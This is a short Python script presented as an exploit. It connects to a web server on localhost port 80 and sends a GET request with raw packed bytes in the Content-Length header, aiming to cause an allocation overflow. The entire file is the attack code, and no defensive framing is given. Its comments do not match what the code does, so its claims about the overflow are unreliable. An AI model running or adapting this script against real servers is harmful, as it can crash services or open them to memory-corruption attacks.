#!/usr/bin/env python3
import socket
import struct
import sys

def exploit_get_overflow():
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 80))
    
    # Craft malicious GET request with large size value
    # The first 4 bytes will be used as multiplier for allocation
    size_value = 0x1000000  # Large value to cause overflow
    size_bytes = struct.pack('<I', size_value)
    
    # Construct GET request with malicious size in first 4 bytes
    request = b'GET / HTTP/1.1\r\n'
    request += b'Host: localhost\r\n'
    request += b'Content-Length: ' + size_bytes + b'\r\n'
    request += b'\r\n'
    
    # Send the request
    print("[*] Sending malicious GET request...")
    s.send(request)
    
    # Receive response
    response = s.recv(1024)
    print("[*] Response received:", response)
    
    s.close()

if __name__ == "__main__":
    exploit_get_overflow() 